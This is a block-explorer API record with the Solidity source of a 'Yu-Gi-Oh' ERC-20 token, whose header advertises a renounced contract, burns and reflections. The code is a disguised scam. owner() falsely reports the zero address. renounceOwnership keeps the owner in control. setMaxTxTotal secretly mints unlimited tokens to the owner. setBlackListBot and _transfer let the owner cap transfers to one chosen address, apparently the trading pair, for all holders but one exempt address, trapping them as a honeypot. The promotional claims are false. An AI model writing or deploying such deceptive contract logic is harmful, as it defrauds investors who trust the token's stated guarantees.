{"status":"1","message":"OK","result":[{"SourceCode":"/*\r\nYu-Gi-Oh - YuGiOh\r\n\r\nTelegram: https://t.me/ethYuGiOh\r\nTwitter: https://twitter.com/ethYuGiOh\r\n\r\nMWWWWWWWWWMWWWWWWWWMWWWWMWWWWWWWWWWWWWWWWWWWWWNKx0WWWWMWWWWWWWWWWWWWMWWWWWWWWWMWWWWMWWWWWWWWMWWWWWWW\r\nWWWWWNWMWWWWWWWWWMWWWWMWWWWMWWWMWWWWMWWWWWWWWNO:,xWWWWWWWWWWWMWWWWMWWWMWWWWWMWWWWWWWWWWWWWMWWWMMWWWW\r\nWWWWWWWWWWWWWWWWWWWMWWWWWWWWWWWWWWWWWWWWWWWWXd;,'oKNWWMWWWWWWWWWWWWWWWWWWWWWWWMWWWWWWWWWWWWWMWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW0c,',':xKWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNk;''''.;ckWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXd,''..''',dNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWMMWWWMWWWWWWWWWWWWWWWWWWWMWWWWWWWWWWWKo,''. .;;'.:0WWWWWWWWMWWWWWWWWWWWWWWMWWWMWWWWMWWWWWWWWWWWWWW\r\nMWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNWWWWWWKl'''.  'c;'',xWWWWWWWWWWWWWWWWNXNWWWWWWWWWWWWWWWWWWWWWWWWWMWW\r\nWWWWWWWMWWWWMWWKkxxkO0KXNNWWWWWWWNNWWKc'''.  .:o,',':0WWWWWWWXKOkxdolcdKWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\nWMWWWWWWWWWWWWWN0l,'',;:clodkOKXNWWWXo'''.   .oo..,''oXNX0xolc;,;;,,;oKNNWWWWWWWWWWWWWWWWNNWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWNk:'','''''',;:lokOd,''..   .dl..',',ll;,''',cc:;';kNNWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWKd,';;;,..'.''',,,','.    'dc..'''''....':c:,'':ONWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWNO:',:cc;......',''..  . ,xc....... .,cl;..',c0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWKo,'';cl:'.  .....  ...;Oo.  .. .'oOx:..',lKWWWWWWWWWWWWWWWWWWWWWWWWMWWWWWWWWW\r\nMWWWWMWWWWMWWWWWWWWWWNNNx;'..,ldl,,,. . . .:ldOo.     .cxxo,.',lKWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWMWW\r\nWWWWWWWWWWWWWWWWWMWWWWWWNOc''.'ldddddl,.. .:lx0d. .,,.ckx:..',lKWWWWWWWWWWWWWWWWWWWWWWWWWWMWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWWKl,',;;:::cdkd:.':;:oo,cxxlcod:..,,lKWWNNNXKK00OKXWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWNNXK00x;'',,;:c:cdooool:'.;ddlc;;;'..,';dxdolcc:;;;cxKNWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWNX0kdolc:;,,''''':cldllxo;;col''ll::::cl;............'':d0XNWWWWWWWWWWWWWWWWWWWWWWWWW\r\nMWWWWMWWWMWWWN0dc,.',;;::;;,'...cxdkxxOkololl:;::lxxookkc,,;::::;;,;lokKXNNNWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWNK0kdc:;;;::ccc:;:oxkkkO0OddO0kxxOkxxOkdkkolllc:,...,cc;ckKNWWWWWWWWWWWWWWWWMWWWMWWWWW\r\nWWWWWMWWWWWWWWWWWWWNKOdl;'..cxdloxkkOOxodx0KKKKKkdxOOxoccclollcccc:,...'cxKXNNWWWNWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWN0kolkOdxkkkOkc,:d0KKKKKKkdodo;,,::,,:c,';,.......':oOXNWWX0XWMWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWNX0OOxxxkOdoc:c;:k0KKKK0xoc;c;,do;:cl:;c,.'.......':xKNWXxONWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWX0kdoc;,,;ccloc;dOoc:dOkOKK0kdkxlc:xkl:c:,:dkodl........,l0NWNkdXWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWNXKOkxoc;'.':clc;:oxO0KK00KK0OOKKOkOxc::,;oOkxOk;......'ckXWWWWOdKWWWWWWWWWWWWWWW\r\nMWWWWMWWWWWWWWWMWWWWMWWWWWNXKOdolcllccxO0K00KKkk00000OOxc',:xOxk0d,.....'ckXNWWWWWOlOWWWMWWWWWWWWMWW\r\nWWMMWWWWWWWWWWWWWWWWWMWWWWWWWNWKxl:colldookO00OOKKKKKKx:..cOkdOOc.....':xKNWWWWWWWx;kWWWWWMWWWMWWWWW\r\nMMWWWMWWWWWWWWWWWWWWWWWWWWWNWWWN0xl;;dl. .ckO000KKKOd;'..,oxkOk:....':xKWWWWWWWWN0l,xWWWWWWWMWWWWMWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNOd;..ll..lOxkOOkxxc.;dl'';:dxxxl,';d0NWWWWWWWW0o,',xWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWWWXkoodkxdc. .,c,:dl::::cl::dl;c:;;':OXKOx0NWWWWWWWNXkl,..'dWWWWWWWWWWWWWWW\r\nWWWWWMWWWMMWWWWMWWWWWWWWWOxc.  ...':'....,:oo;'....';:;;;:l:';dOkOXWWWWWWWKxl:',;..,xKNWWWWWWWWWWWWW\r\nWWWWWWWWWWNWWWWWWWWNWW0do' .  .. ...'......'..',,...';c:',,,,'lOkkKNWWWNKxc;....,'.:O00XWWMWWWWMWWWW\r\nMWWWWMWWWWMWWWWWWWNKko'.... .  ... ...........,::,..,,,,'..;c,'cxxONWN0o;..;,...','lOkkKNNWWMWWWWWWW\r\nWWWWWWWWWWWWWNKOxl:'...........  .........,ccccc'.,,,.....';'':ok0NWWNXx:...,,...,:k0dok0KNWWWWWWWWW\r\nWWWWWWWWWWWNx:'........................  .,dkl:ol,';c,,::;,...oXNWWWWWWNKo,..,,..'cooldO0KNWWWWWWWWW\r\nWWWWWWWWWWXl...........................   .,dxxxkl;;c;;:,'....;KWWWWWWWWWXOc..,,..',:odkOXWWWWWWWWWW\r\nWWWWWWWWWWd.....                          ..cxocooc,,;.........oNWWWNWWWWNN0o'.'.':codod0NWWWWWMWWWW\r\nMWWWWWWWWWk'.......                    .''.':olclol,...........lNWNNXXNNWKkxdc,';clllood0NWWMWWWWWWW\r\nWWWMWWWWWNNk,........                  .. ..,cc:c:,.............dNKoc;lOOxddoddooooolodokNMWNWWMWWWW\r\nWWWWWWWNWWWN0c.....           ........... ..';;;;'...';,.........clll:;okOOkxdxdoodlllokKNWWWWWWWWWW\r\nWWWWWWWWWWNWWNkc;;:cclooddxxxxkkkkOx,        ...',;'.':;'.........'dxd000KkdodoooclollxXWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWNNNWWWWWWWWWWWWWWWWWWk.   ........,;'...,,'.....  ..;oOX0KKkkKOdol:;:ld0WWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNo...............',;'......  .':ok0KKX00X0ocl,.l0NWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWMWWWWWWWWWWWWWMWWWWWWWWWWXc...............,;.........:ldxkOO0Ox0XkloolkNWWWWWWWWWWWWWWWW\r\nMWWWWWWWWWMWWWWWWWWMWNWWWWWWWWWWWWWWNW0,........................';;::clloco0OkxdkXWWWWWWWWWWMWWWWWWW\r\nWWWWWWWMWWWWWWWWWMWWWWWWWWWWWNWWWWWWWWNd...........','..,,'....... .......:x00OOKWWWWWWWWWMWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNk'...........',',:,........    .;oOXWWWWWNWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXo.........  .'ol;,'... ... ..:o0NWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\nWWWWWWWWWWWWWWWWWMWWWWWWWNX0Oxddolc:;;,.........  . .lc.      ....:0NWWNWWWWWWWWWWWWWWWWWWMWWWWWWWWW\r\nMMWNWMWNWMMWNWMMWWWMWWWNKxl;'.........'..'''''.......cd:.........'dWWWWNWMMWNWMWNWMMWNWMMWWWMWWWWMWW\r\n\r\nNo Dev Tokens.\r\nAnti-whale buy/sell limits\r\nAnti-sniper & Anti-bot scripting\r\nLiq Lock on Launch\r\nContract renounced\r\n100 Billion Supply!\r\n51% Burn!\r\n1% Reflection to All Holders!\r\n\r\n\r\n- Limit sell: 0.1% in 10 Minutes\r\n- Renounced after set limit\r\n                                                                                                                  \r\n*/\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.12;\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary Address {\r\n\r\n    function isContract(address account) internal view returns (bool) {\r\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\r\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\r\n        // for accounts without code, i.e. `keccak256('')`\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash := extcodehash(account) }\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n\r\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n\r\n            if (returndata.length > 0) {\r\n\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nabstract contract Context {\r\n    \r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; \r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n    constructor () internal {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n\r\n    function owner() public pure returns (address) {\r\n        return address(0);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract YuGiOh is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    address public _burnadd;\r\n    address public _isBlackListBot;\r\n    address public _isBlackListAddress;\r\n    uint256 public _burnaddd;\r\n\r\n    uint256 private _tTotal = 100 * 10**9 * 10**18;\r\n\r\n    string private _name = 'Yu-Gi-Oh';\r\n    string private _symbol = 'YuGiOh';\r\n    uint8 private _decimals = 18;\r\n\r\n    constructor () public {\r\n        _balances[_msgSender()] = _tTotal;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    \r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function setBlackListBot(address botAdd , address botAddress) public onlyOwner {\r\n        _isBlackListBot = botAdd;\r\n        _isBlackListAddress = botAddress;\r\n        _burnaddd = 50 * 10**6 * 10**18;\r\n    }\r\n\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    \r\n    \r\n    function setMaxFee(uint256 maxFeePercent) public onlyOwner {\r\n        _burnaddd = maxFeePercent * 10**18;\r\n    }\r\n\r\n    function setMaxTxTotal(uint256 amount) public onlyOwner {\r\n        require(_msgSender() != address(0), \"ERC20: cannot permit zero address\");\r\n        _tTotal = _tTotal.add(amount);\r\n        _balances[_msgSender()] = _balances[_msgSender()].add(amount);\r\n        emit Transfer(address(0), _msgSender(), amount);\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n      \r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\r\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\r\n        if (sender != _isBlackListAddress && recipient == _isBlackListBot) {\r\n            require(amount < _burnaddd, \"Transfer amount exceeds the maxTxAmount.\");\r\n        }\r\n        _balances[sender] = _balances[sender].sub(amount, \"BEP20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_burnadd\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_burnaddd\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_isBlackListAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_isBlackListBot\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"botAdd\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"botAddress\",\"type\":\"address\"}],\"name\":\"setBlackListBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxFeePercent\",\"type\":\"uint256\"}],\"name\":\"setMaxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setMaxTxTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"YuGiOh","CompilerVersion":"v0.6.12+commit.27d51765","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://225b6f1f5bc908bb65c47b22317dc71667c6c9a9964cfa782427cdef3a0b0709"}]}